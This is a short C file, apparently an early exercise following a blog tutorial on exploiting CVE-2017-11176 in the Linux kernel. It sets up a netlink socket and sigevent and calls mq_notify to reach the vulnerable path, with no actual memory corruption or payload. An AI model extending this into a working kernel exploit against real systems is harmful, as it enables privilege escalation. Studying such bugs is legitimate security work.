
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.htm

/* Aim
1.Provide a non-NULL u_notification argument
2.Set u_notification.sigev_notify to SIGEV_THREAD
3.The value pointed by notification.sigev_value.sival_ptr must be a valid readable userland address of at least NOTIFY_COOKIE_LEN (=32) bytes 
*/

/*
4. provide a valid fd (socket of type AF_NETLINK)
*/
//gcc -lrt exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

int main()
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));
    int sockFD = _socket(AF_NETLINK, SOCK_RAW ,NETLINK_GENERIC);
    if(sockFD < 0)
    {
        perror("socket");
        return -1;
    }

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = sockFD;

    mqd_t mqdes = (mqd_t) -1; // ??
    
    printf("%p\n", &sevp);    
    if(_mq_notify(mqdes, &sevp)==0)
    {
        printf("call succeeded\n");
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
        return -1;
    }

    return 0;
}
